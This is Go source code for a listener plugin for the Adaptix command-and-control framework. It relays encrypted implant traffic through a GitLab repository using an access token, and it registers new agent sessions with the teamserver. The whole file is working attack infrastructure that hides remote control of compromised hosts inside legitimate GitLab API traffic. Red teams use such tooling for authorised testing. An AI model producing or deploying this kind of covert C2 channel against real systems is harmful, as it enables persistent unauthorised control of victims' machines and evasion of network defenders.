package main

import (
	"bytes"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"

	adaptix "github.com/Adaptix-Framework/axc2/v2"
)

type PluginListener struct{}

var (
	Ts              adaptix.Teamserver
	ModuleDir       string
	ListenerDataDir string
)

func InitPlugin(ts any, moduleDir string, listenerDir string) adaptix.PluginListener {
	ModuleDir       = moduleDir
	ListenerDataDir = listenerDir
	if ts != nil {
		Ts = ts.(adaptix.Teamserver)
	}
	return &PluginListener{}
}

func (p *PluginListener) Call(operator, listenerName, function, args string) {}

// ===== Config =====

type TransportConfig struct {
	// GitLab connection
	GitLabURL   string `json:"gitlab_url"`    // e.g. https://gitlab.com or https://git.corp.local
	AccessToken string `json:"access_token"`  // Personal / Project Access Token
	ProjectID   string `json:"project_id"`    // namespace/project or numeric ID
	Branch      string `json:"branch"`        // branch to use (default: main)
	RepoPath    string `json:"repo_path"`     // optional sub-directory inside the repo

	// Timing
	PollInterval   int `json:"poll_interval"`    // server poll interval in seconds
	PollAttempts   int `json:"poll_attempts"`    // agent-side poll attempts for r_*.dat
	PollIntervalMs int `json:"poll_interval_ms"` // agent-side poll interval between attempts (ms)

	// Crypto / identity
	EncryptKey string `json:"encrypt_key"` // 32-char hex AES-128 key
	AgentCrc   string `json:"agent_crc"`   // 8-char hex watermark matching NAX_LISTENER_WM
}

type extenderListener struct {
	name      string
	config    TransportConfig
	transport *TransportGitLab
	active    bool
}

func generateEncryptKey() string {
	key := make([]byte, 16)
	rand.Read(key)
	return hex.EncodeToString(key)
}

func (p *PluginListener) Create(name, config string, customData []byte) (adaptix.ExtenderListener, adaptix.ListenerData, []byte, error) {
	var conf TransportConfig

	if customData == nil {
		if err := json.Unmarshal([]byte(config), &conf); err != nil {
			return nil, adaptix.ListenerData{}, nil, err
		}

		// Defaults
		if conf.GitLabURL == "" {
			conf.GitLabURL = "https://gitlab.com"
		}
		if conf.Branch == "" {
			conf.Branch = "main"
		}
		if conf.EncryptKey == "" {
			conf.EncryptKey = generateEncryptKey()
		}
		if conf.AgentCrc == "" {
			conf.AgentCrc = "deadbeef"
		}
		if conf.PollAttempts <= 0 {
			conf.PollAttempts = 15
		}
		if conf.PollIntervalMs <= 0 {
			conf.PollIntervalMs = 3000
		}
		if conf.PollInterval <= 0 {
			conf.PollInterval = 5
		}

		// Required fields
		if conf.AccessToken == "" || conf.ProjectID == "" {
			return nil, adaptix.ListenerData{}, nil,
				fmt.Errorf("gitlab mode requires access_token and project_id")
		}
	} else {
		if err := json.Unmarshal(customData, &conf); err != nil {
			return nil, adaptix.ListenerData{}, nil, err
		}
	}

	listener := &extenderListener{
		name:      name,
		config:    conf,
		transport: NewTransportGitLab(name, conf),
		active:    false,
	}

	listenerData := adaptix.ListenerData{
		Name:      name,
		BindHost:  conf.GitLabURL,
		BindPort:  conf.ProjectID,
		AgentAddr: conf.GitLabURL,
		Protocol:  "gitlab",
		Type:      "external",
		Status:    "stopped",
		Watermark: conf.AgentCrc,
	}

	customOut, err := json.Marshal(conf)
	if err != nil {
		return nil, listenerData, nil, err
	}
	return listener, listenerData, customOut, nil
}

func (l *extenderListener) Start() error {
	l.active = true
	return l.transport.Start()
}

func (l *extenderListener) Stop() error {
	l.active = false
	return l.transport.Stop()
}

func (l *extenderListener) Edit(config string) (adaptix.ListenerData, []byte, error) {
	var conf TransportConfig
	if err := json.Unmarshal([]byte(config), &conf); err != nil {
		return adaptix.ListenerData{}, nil, err
	}
	if conf.Branch != ""        { l.config.Branch = conf.Branch }
	if conf.RepoPath != ""      { l.config.RepoPath = conf.RepoPath }
	if conf.PollInterval > 0    { l.config.PollInterval = conf.PollInterval }
	if conf.PollAttempts > 0    { l.config.PollAttempts = conf.PollAttempts }
	if conf.PollIntervalMs > 0  { l.config.PollIntervalMs = conf.PollIntervalMs }
	l.transport.Config = l.config

	status := "stopped"
	if l.active { status = "running" }

	listenerData := adaptix.ListenerData{
		Name:      l.name,
		BindHost:  l.config.GitLabURL,
		BindPort:  l.config.ProjectID,
		AgentAddr: l.config.GitLabURL,
		Protocol:  "gitlab",
		Type:      "external",
		Status:    status,
		Watermark: l.config.AgentCrc,
	}
	customOut, err := json.Marshal(l.config)
	return listenerData, customOut, err
}

func (l *extenderListener) GetProfile() ([]byte, error) {
	var buffer bytes.Buffer
	if err := json.NewEncoder(&buffer).Encode(l.config); err != nil {
		return nil, err
	}
	return buffer.Bytes(), nil
}

func (l *extenderListener) InternalHandler(data []byte) (int64, error) {
	// data from cmd_link result (via pl_results.go):
	//   [aes_key(16)][sessionId(16)][encrypted_register...]
	//
	// CreateAgent expects beatWithId as:
	//   [beaconID(16)][aesKey(16)][encrypted_frame]
	//
	// So:  beaconID  = sessionId  = data[16:32]
	//      aesKey    = child key  = data[0:16]
	//      ciphertext             = data[32:]
	if len(data) < 33 {
		return 0, fmt.Errorf("InternalHandler: data too short (%d)", len(data))
	}
	childAesKey := data[0:16]
	sessionId   := data[16:32]
	ciphertext  := data[32:]

	beatWithId := make([]byte, 16+16+len(ciphertext))
	copy(beatWithId[:16], sessionId)    // beaconID
	copy(beatWithId[16:32], childAesKey) // aesKey used to decrypt the frame
	copy(beatWithId[32:], ciphertext)

	agentData, err := Ts.TsAgentCreate(l.config.AgentCrc, sessionId, beatWithId, l.name, "gitlab-api", false)
	if err != nil {
		return 0, fmt.Errorf("InternalHandler: TsAgentCreate: %w", err)
	}
	return agentData.Id, nil
}
